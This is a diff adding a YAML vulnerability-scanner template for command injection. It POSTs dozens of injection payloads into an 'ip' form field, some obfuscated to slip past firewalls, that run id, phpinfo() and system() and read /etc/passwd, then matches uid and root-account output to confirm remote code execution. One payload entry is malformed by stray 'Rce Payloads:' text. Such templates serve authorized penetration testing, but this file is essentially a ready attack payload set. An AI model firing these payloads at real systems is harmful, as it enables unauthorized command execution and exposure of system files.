@@ -1,0 +1,96 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "%26id"
+        - ";system(\"id\");"
+        - ";system(\"id\")"
+        - "cat$u /e${hahaha}tc/${heywaf}pas${heywaf}s"
+        - "%7Bsystem, \"id\"\\}"
+        - "| id"
+        - "system('cat /etc/passwd');"
+        - "%2Cid"
+        - "%22id%22"
+        - "%26id%26"
+        - "%7Ccat+/etc/passwd"
+        - "%27id"
+        - "%26%20id"
+        - "a)|id"
+        - "| id |"
+        - "| id |"
+        - ";id%20"
+        - "%26id"
+        - ";id|"
+        - "&cat$u /etc$u/passwd$u"
+        - "%26cat%2520/etc/passwd"
+        - "id|"
+        - "cat /etc/passwd"
+        - "%24%7Bprint_r%28cat%28/etc/passwd%29%29%7D"
+        - "%26%20id%7C%22%23%3B%7D%2Fetc%24%7BIFS%3D-1%7Dpasswd"
+        - "%2Aid;"
+        - "%24%7Bcat,etc%2Fpasswd%7D%0A"
+        - "%7Ccat+/etc/passwd"
+        - "\\nid\\n"
+        - "cat /etc/passwd"
+        - "a%24u;id"
+        - ";phpinfo()"
+        - "Rce Payloads:
+%3Bcat+/etc/passwd"
+        - "%24%7B%40phpinfo%28%29%7D"
+        - "cat$u /e${hahaha}tc/${hehehe}$u/passwd "
+        - ";system(\"cat /etc/passwd\")%26"
+        - "%7Ccat%24u%2B%2Fetc%24u%2Fpasswd%24u"
+        - ";id"
+        - "cat $u /etc$u/passwd$u"
+        - "%24%28cat%20%2Fe%24utc%2Fetc%2Fpasswd%29"
+        - "cat /etc/passwd"
+        - "%2Fusr%24u%3Dharry%22n%22waf%24u%23?%4C%40id"
+        - "cat /etc/passwd"
+        - "%2C%20id"
+        - "%60id%60;"
+        - "a;/usr/bin/id"
+        - ";id"
+        - "system('cat /etc/passwd');"
+        - "a;id"
+        - "%2Aid"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
